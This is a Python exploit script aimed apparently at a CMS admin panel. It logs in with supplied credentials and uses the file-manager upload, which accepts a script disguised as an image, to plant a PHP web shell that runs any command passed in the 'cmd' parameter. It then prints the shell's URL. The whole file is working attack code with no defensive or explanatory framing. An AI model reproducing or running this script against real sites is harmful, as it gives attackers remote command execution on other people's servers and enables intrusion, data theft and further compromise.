import requests
import sys
import time
import random
import string

def generate_filename():
""" Generate a 5-character random string for filename. """
return ''.join(random.choices(string.ascii_lowercase, k=5)) + ".inc"

def login(site, username, password):
print("Logging in...")
time.sleep(2)
login_url = f"https://{site}/admin/system"
session = requests.Session()
login_data = {
'data[Admin][admin_id]': username,
'data[Admin][admin_password]': password
}
headers = {
'Content-Type': 'application/x-www-form-urlencoded'
}
response = session.post(login_url, data=login_data, headers=headers)
if "Logout" in response.text:
print("Login Successful!")
return session
else:
print("Login Failed!")
sys.exit()

def upload_shell(session, site):
print("Shell preparing...")
time.sleep(2)
filename = generate_filename()
upload_url = f"https://{site}/admin/filemanager/upload"
files = {
'data[filemanager][image]': (filename, "<html><body><form method='GET'
name='<?php echo basename($_SERVER['PHP_SELF']); ?>'><input type='TEXT'
name='cmd' autofocus id='cmd' size='80'><input type='SUBMIT'
value='Execute'></form><pre><?php if(isset($_GET['cmd'])){
system($_GET['cmd']); } ?></pre></body></html>", 'image/jpeg')
}
data = {
'submit': 'Upload'
}
response = session.post(upload_url, files=files, data=data)
if response.status_code == 200 and "uploaded successfully" in response.text:
print(f"Your Shell is Ready: https://{site}/uploads/filemanager/{filename}")
else:
print("Exploit Failed!")
sys.exit()

if __name__ == "__main__":
print("Exploiting...")
time.sleep(2)
if len(sys.argv) != 4:
print("Usage: python exploit.py sitename.com username password")
sys.exit()
site = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
session = login(site, username, password)
upload_shell(session, site)
